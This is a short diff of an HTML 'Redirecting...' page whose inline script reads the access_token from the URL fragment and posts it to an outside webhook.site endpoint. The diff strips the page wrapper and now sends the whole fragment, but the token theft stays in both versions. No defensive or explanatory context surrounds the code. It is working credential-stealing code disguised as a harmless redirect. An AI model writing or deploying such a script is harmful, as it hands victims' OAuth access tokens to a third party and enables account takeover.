@@ -1,24 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<title>Redirecting...</title>
-</head>
-<body>
 <script>
-  const hash = window.location.hash.substring(1);
-  const params = new URLSearchParams(hash);
-  const token = params.get("access_token");
-
-  if (token) {
+  const hash = window.location.hash;
+  if (hash && hash.includes("access_token")) {
     fetch("https://webhook.site/42931b3c-0851-49e3-8558-541ba2a8b3ad", {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
-      body: token
-    }).catch(console.error);
-
-    window.history.replaceState(null, null, window.location.pathname);
+      body: hash
+    });
   }
 </script>
-</body>
-</html>
